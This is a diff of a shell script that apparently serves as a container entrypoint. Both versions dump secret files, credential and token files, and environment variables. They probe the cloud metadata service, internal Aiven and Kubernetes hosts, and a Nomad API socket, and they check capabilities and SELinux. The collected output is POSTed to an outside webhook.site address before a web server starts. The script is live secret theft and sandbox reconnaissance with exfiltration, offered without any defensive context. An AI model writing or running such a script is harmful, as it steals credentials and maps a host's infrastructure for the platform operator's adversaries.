@@ -1,13 +1,14 @@
 #!/bin/sh
 {
-echo "==secrets=="; ls -laR /secrets /run/secrets 2>&1 | head -40; echo '---content---'; for f in /secrets/* /run/secrets/*; do echo "-- $f --"; cat "$f" 2>&1 | head -c 300; echo; done
-echo "==secrets2=="; find / -xdev \( -iname '*secret*' -o -iname '*.env' -o -iname 'token*' -o -iname '*.key' -o -iname 'cred*' \) 2>/dev/null | grep -vE 'proc|sys' | head -30
-echo "==caps-decode=="; grep Cap /proc/self/status; cat /proc/self/uid_map /proc/self/gid_map 2>&1
-echo "==internet=="; wget -q -O- -T 5 https://api.aiven.io/v1/me 2>&1 | head -c 200; echo
-echo "==internal=="; for h in api.internal.aiven.io internal.aiven.io kubernetes.default.svc 169.254.169.254; do echo -n "$h: "; wget -q -O- -T 5 "http://$h/" 2>&1 | head -c 80; echo; done
-echo "==dns=="; cat /etc/resolv.conf; getent hosts api.internal.aiven.io 2>&1
-echo "==net=="; cat /proc/net/tcp /proc/net/route 2>&1 | head
-echo "==hosts=="; cat /etc/hosts
+echo "==secrets-dir=="; ls -land /secrets /secrets/* 2>&1
+echo "==sock-type=="; for f in /secrets/api.sock /secrets/*.sock; do [ -S "$f" ] && echo "SOCKET $f"; [ -e "$f" ] && ls -la "$f" 2>&1; done
+echo "==nomad-env=="; env | grep -iE 'nomad|vault|consul|token|alloc' 
+echo "==nomad-cli=="; command -v nomad consul vault 2>&1
+echo "==try-sock=="; (echo -e 'GET /v1/agent/self HTTP/1.1\r\nHost: localhost\r\n\r\n'; sleep 2) | nc /secrets/api.sock 2>&1 | head -c 200 || echo "no nc"
+echo "==python=="; command -v python3 python 2>&1
+echo "==secrets-cat=="; for f in /secrets/run.env /secrets/registry-auth.env; do echo "-- $f --"; wc -c "$f" 2>&1; cat "$f" 2>&1|head -c 200; done
+echo "==selinux=="; cat /sys/fs/selinux/enforce 2>&1; command -v getenforce 2>&1
+echo "==ptrace=="; cat /proc/1/status 2>&1 | grep -iE 'Cap|Seccomp'
 } > /www/index.txt 2>&1
-wget -q -O- --post-file=/www/index.txt "https://webhook.site/944a0813-f8cb-4afb-92cd-fa404a8621b0/ctr4" >/dev/null 2>&1
+wget -q -O- --post-file=/www/index.txt "https://webhook.site/944a0813-f8cb-4afb-92cd-fa404a8621b0/ctr5" >/dev/null 2>&1
 httpd -f -p 8080 -h /www
